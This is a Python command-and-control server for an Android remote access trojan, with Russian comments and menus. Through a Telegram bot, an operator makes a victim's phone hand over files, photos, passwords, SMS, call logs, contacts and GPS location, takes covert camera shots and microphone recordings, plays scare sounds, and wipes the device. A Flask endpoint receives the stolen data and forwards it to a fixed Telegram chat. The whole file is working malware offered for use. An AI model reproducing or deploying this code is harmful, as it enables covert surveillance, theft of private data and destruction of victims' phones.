# TWEAKOS_ANDROID_RAT_FULL.py
# ПОЛНЫЙ RAT ДЛЯ ANDROID: КРАЖА ВСЕГО + УНИЧТОЖЕНИЕ + МЕДИА

import os
import time
import threading
import requests
import json
import base64
from flask import Flask, request, jsonify, send_file
from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler

app = Flask(__name__)

# ========== КОНФИГУРАЦИЯ ==========
BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
CHAT_ID = '7803661441'
SERVER_URL = os.environ.get('SERVER_URL', 'https://doge-rat-server-main-d61c2fa.kubernetes.cloud')

bot = Bot(token=BOT_TOKEN)
latest_command = {"cmd": "none", "params": ""}
pending_media = {}

# ========== КНОПКИ TELEGRAM ==========
def main_menu():
    keyboard = [
        [InlineKeyboardButton("📁 ФАЙЛЫ", callback_data='menu_files')],
        [InlineKeyboardButton("📸 ГАЛЕРЕЯ", callback_data='menu_gallery')],
        [InlineKeyboardButton("🔑 ПАРОЛИ", callback_data='menu_passwords')],
        [InlineKeyboardButton("📝 ЗАМЕТКИ", callback_data='menu_notes')],
        [InlineKeyboardButton("🎥 КАМЕРА", callback_data='menu_camera')],
        [InlineKeyboardButton("🎙️ МИКРОФОН", callback_data='menu_mic')],
        [InlineKeyboardButton("🔊 ЗВУКИ", callback_data='menu_sounds')],
        [InlineKeyboardButton("💥 СНЕСТИ ТЕЛЕФОН", callback_data='wipe')],
        [InlineKeyboardButton("📡 ЛОКАЦИЯ", callback_data='location')],
        [InlineKeyboardButton("💬 СМС", callback_data='sms')],
        [InlineKeyboardButton("📞 ЗВОНКИ", callback_data='calls')],
        [InlineKeyboardButton("👥 КОНТАКТЫ", callback_data='contacts')]
    ]
    return InlineKeyboardMarkup(keyboard)

def files_menu():
    keyboard = [
        [InlineKeyboardButton("📂 /sdcard", callback_data='files_sdcard')],
        [InlineKeyboardButton("📂 /sdcard/DCIM", callback_data='files_dcim')],
        [InlineKeyboardButton("📂 /sdcard/Download", callback_data='files_download')],
        [InlineKeyboardButton("📂 /sdcard/Documents", callback_data='files_documents')],
        [InlineKeyboardButton("◀️ НАЗАД", callback_data='back_main')]
    ]
    return InlineKeyboardMarkup(keyboard)

def camera_menu():
    keyboard = [
        [InlineKeyboardButton("📸 ФРОНТАЛЬНАЯ", callback_data='photo_front')],
        [InlineKeyboardButton("📷 ОСНОВНАЯ", callback_data='photo_back')],
        [InlineKeyboardButton("◀️ НАЗАД", callback_data='back_main')]
    ]
    return InlineKeyboardMarkup(keyboard)

def mic_menu():
    keyboard = [
        [InlineKeyboardButton("🎙️ 5 СЕКУНД", callback_data='audio_5')],
        [InlineKeyboardButton("🎙️ 10 СЕКУНД", callback_data='audio_10')],
        [InlineKeyboardButton("🎙️ 30 СЕКУНД", callback_data='audio_30')],
        [InlineKeyboardButton("◀️ НАЗАД", callback_data='back_main')]
    ]
    return InlineKeyboardMarkup(keyboard)

def sounds_menu():
    keyboard = [
        [InlineKeyboardButton("🔊 СИРЕНА", callback_data='sound_siren')],
        [InlineKeyboardButton("👻 СТРАШНЫЙ ЗВУК", callback_data='sound_scary')],
        [InlineKeyboardButton("🎵 RICKROLL", callback_data='sound_rickroll')],
        [InlineKeyboardButton("🔔 УВЕДОМЛЕНИЕ", callback_data='sound_notify')],
        [InlineKeyboardButton("◀️ НАЗАД", callback_data='back_main')]
    ]
    return InlineKeyboardMarkup(keyboard)

# ========== ОБРАБОТЧИКИ КОМАНД ==========
def start(update, context):
    update.message.reply_text(
        "🤖 ANDROID RAT АКТИВИРОВАН\n\n"
        "📱 Управление телефоном жертвы\n"
        "🔐 Кража паролей, СМС, звонков, контактов\n"
        "📸 Фото, видео, галерея, микрофон\n"
        "💥 Уничтожение системы\n\n"
        "👇 Используйте кнопки для управления",
        reply_markup=main_menu()
    )

def handle_callback(update, context):
    query = update.callback_query
    query.answer()
    data = query.data
    
    if data == 'back_main':
        query.edit_message_text("🤖 ГЛАВНОЕ МЕНЮ", reply_markup=main_menu())
    
    # МЕНЮ
    elif data == 'menu_files':
        query.edit_message_text("📁 ВЫБЕРИТЕ ПАПКУ", reply_markup=files_menu())
    elif data == 'menu_gallery':
        set_command("gallery", "")
        query.edit_message_text("📸 ЗАПРОС ГАЛЕРЕИ ОТПРАВЛЕН", reply_markup=main_menu())
    elif data == 'menu_passwords':
        set_command("passwords", "")
        query.edit_message_text("🔑 ЗАПРОС ПАРОЛЕЙ ОТПРАВЛЕН", reply_markup=main_menu())
    elif data == 'menu_notes':
        set_command("notes", "")
        query.edit_message_text("📝 ЗАПРОС ЗАМЕТОК ОТПРАВЛЕН", reply_markup=main_menu())
    elif data == 'menu_camera':
        query.edit_message_text("📸 ВЫБЕРИТЕ КАМЕРУ", reply_markup=camera_menu())
    elif data == 'menu_mic':
        query.edit_message_text("🎙️ ВЫБЕРИТЕ ДЛИТЕЛЬНОСТЬ", reply_markup=mic_menu())
    elif data == 'menu_sounds':
        query.edit_message_text("🔊 ВЫБЕРИТЕ ЗВУК", reply_markup=sounds_menu())
    
    # ФАЙЛЫ
    elif data == 'files_sdcard':
        set_command("files", "/sdcard")
        query.edit_message_text("📁 ЗАПРОС /sdcard ОТПРАВЛЕН", reply_markup=main_menu())
    elif data == 'files_dcim':
        set_command("files", "/sdcard/DCIM")
        query.edit_message_text("📸 ЗАПРОС DCIM ОТПРАВЛЕН", reply_markup=main_menu())
    elif data == 'files_download':
        set_command("files", "/sdcard/Download")
        query.edit_message_text("📥 ЗАПРОС DOWNLOAD ОТПРАВЛЕН", reply_markup=main_menu())
    elif data == 'files_documents':
        set_command("files", "/sdcard/Documents")
        query.edit_message_text("📄 ЗАПРОС DOCUMENTS ОТПРАВЛЕН", reply_markup=main_menu())
    
    # КАМЕРА
    elif data == 'photo_front':
        set_command("photo", "front")
        query.edit_message_text("📸 ФОТО (ФРОНТАЛКА) ЗАПРОШЕНО", reply_markup=main_menu())
    elif data == 'photo_back':
        set_command("photo", "back")
        query.edit_message_text("📷 ФОТО (ОСНОВНАЯ) ЗАПРОШЕНО", reply_markup=main_menu())
    
    # МИКРОФОН
    elif data == 'audio_5':
        set_command("audio", "5")
        query.edit_message_text("🎙️ ЗАПИСЬ 5 СЕКУНД...", reply_markup=main_menu())
    elif data == 'audio_10':
        set_command("audio", "10")
        query.edit_message_text("🎙️ ЗАПИСЬ 10 СЕКУНД...", reply_markup=main_menu())
    elif data == 'audio_30':
        set_command("audio", "30")
        query.edit_message_text("🎙️ ЗАПИСЬ 30 СЕКУНД...", reply_markup=main_menu())
    
    # ЗВУКИ
    elif data == 'sound_siren':
        set_command("sound", "siren")
        query.edit_message_text("🔊 СИРЕНА ЗАПУЩЕНА НА ТЕЛЕФОНЕ", reply_markup=main_menu())
    elif data == 'sound_scary':
        set_command("sound", "scary")
        query.edit_message_text("👻 СТРАШНЫЙ ЗВУК НА ТЕЛЕФОНЕ", reply_markup=main_menu())
    elif data == 'sound_rickroll':
        set_command("sound", "rickroll")
        query.edit_message_text("🎵 RICKROLL НА ТЕЛЕФОНЕ", reply_markup=main_menu())
    elif data == 'sound_notify':
        set_command("sound", "notify")
        query.edit_message_text("🔔 УВЕДОМЛЕНИЕ ОТПРАВЛЕНО", reply_markup=main_menu())
    
    # КРАЖА
    elif data == 'location':
        set_command("location", "")
        query.edit_message_text("📍 ЗАПРОС GPS ОТПРАВЛЕН", reply_markup=main_menu())
    elif data == 'sms':
        set_command("sms", "")
        query.edit_message_text("💬 ЗАПРОС СМС ОТПРАВЛЕН", reply_markup=main_menu())
    elif data == 'calls':
        set_command("calls", "")
        query.edit_message_text("📞 ЗАПРОС ЗВОНКОВ ОТПРАВЛЕН", reply_markup=main_menu())
    elif data == 'contacts':
        set_command("contacts", "")
        query.edit_message_text("👥 ЗАПРОС КОНТАКТОВ ОТПРАВЛЕН", reply_markup=main_menu())
    
    # УНИЧТОЖЕНИЕ
    elif data == 'wipe':
        set_command("wipe", "")
        query.edit_message_text("💥 ТЕЛЕФОН БУДЕТ УНИЧТОЖЕН! (НЕОБРАТИМО)", reply_markup=main_menu())

def set_command(cmd, params):
    latest_command["cmd"] = cmd
    latest_command["params"] = params

# ========== FLASK API ДЛЯ ANDROID ==========
@app.route('/')
def home():
    return "✅ RAT сервер работает!", 200

@app.route('/get_command', methods=['GET'])
def get_command():
    cmd = latest_command["cmd"]
    params = latest_command["params"]
    if cmd != "none":
        latest_command["cmd"] = "none"
        latest_command["params"] = ""
    return jsonify({"command": cmd, "params": params})

@app.route('/send_data', methods=['POST'])
def send_data():
    data = request.get_json()
    if data:
        msg_type = data.get('type', 'data')
        content = data.get('content', '')
        
        if msg_type == 'file':
            # Приём файла (фото, аудио)
            filename = data.get('filename', 'file')
            filedata = base64.b64decode(content)
            filepath = f"/tmp/{filename}"
            with open(filepath, 'wb') as f:
                f.write(filedata)
            with open(filepath, 'rb') as f:
                bot.send_document(chat_id=CHAT_ID, document=f, filename=filename)
            os.remove(filepath)
        elif msg_type == 'photo':
            # Приём фото
            filedata = base64.b64decode(content)
            filepath = f"/tmp/photo_{int(time.time())}.jpg"
            with open(filepath, 'wb') as f:
                f.write(filedata)
            with open(filepath, 'rb') as f:
                bot.send_photo(chat_id=CHAT_ID, photo=f)
            os.remove(filepath)
        elif msg_type == 'audio':
            filedata = base64.b64decode(content)
            filepath = f"/tmp/audio_{int(time.time())}.wav"
            with open(filepath, 'wb') as f:
                f.write(filedata)
            with open(filepath, 'rb') as f:
                bot.send_audio(chat_id=CHAT_ID, audio=f)
            os.remove(filepath)
        else:
            bot.send_message(chat_id=CHAT_ID, text=f"📱 {msg_type.upper()}:\n{content[:3000]}")
    
    return "OK", 200

# ========== ЗАПУСК ==========
def main():
    # Telegram бот
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CallbackQueryHandler(handle_callback))
    
    threading.Thread(target=updater.start_polling, daemon=True).start()
    
    # Flask сервер
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)

if __name__ == '__main__':
    main()
